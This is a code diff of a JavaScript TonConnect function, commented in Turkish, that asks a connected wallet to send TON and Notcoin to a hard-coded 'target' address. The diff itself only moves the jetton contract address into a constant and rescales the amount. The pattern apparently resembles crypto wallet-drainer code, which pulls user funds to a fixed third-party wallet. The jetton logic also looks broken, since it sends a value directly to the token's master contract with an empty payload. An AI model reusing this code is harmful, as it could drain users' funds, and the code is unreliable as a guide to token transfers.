@@ -2,6 +2,8 @@
 import TonWeb from 'tonweb'; // TonWeb kütüphanesini import ediyoruz
 const tonweb = new TonWeb(); // TonWeb'i başlatıyoruz
 
+const NOTCOIN_JETTON_CONTRACT = "0:2F956143C461769579BAEF2E32CC2D7BC18283F40D20BB03E432CD603AC33FFC"; // Notcoin jetton contract adresi
+
 const request_transaction = async (tonConnectUI) => {
   try {
     console.log('Transaction talep ediliyor...');
@@ -22,9 +24,6 @@ const request_transaction = async (tonConnectUI) => {
     // Hedef cüzdan adresini buraya yazın
     const targetAddress = "UQDKbP8AA8sYpdI5v4elb600P5f6tdXbOJrG3vEjnoAiHREB"; // Hedef cüzdan adresi
 
-    // Notcoin jetton contract adresi
-    const notcoinJettonContract = "0:2F956143C461769579BAEF2E32CC2D7BC18283F40D20BB03E432CD603AC33FFC";
-
     // Talep mesajı
     const messages = [
       {
@@ -33,8 +32,8 @@ const request_transaction = async (tonConnectUI) => {
         payload: '', // Payload kısmını boş bırakıyoruz
       },
       {
-        address: notcoinJettonContract, // Notcoin jetton contract adresi
-        amount: amountToRequestNotcoin, // Talep edilen Notcoin miktarı
+        address: NOTCOIN_JETTON_CONTRACT, // Notcoin jetton contract adresi
+        amount: amountToRequestNotcoin * 1e9, // Talep edilen Notcoin miktarını nano cinsinden belirtin
         payload: '', // Payload kısmını boş bırakıyoruz
       },
     ];
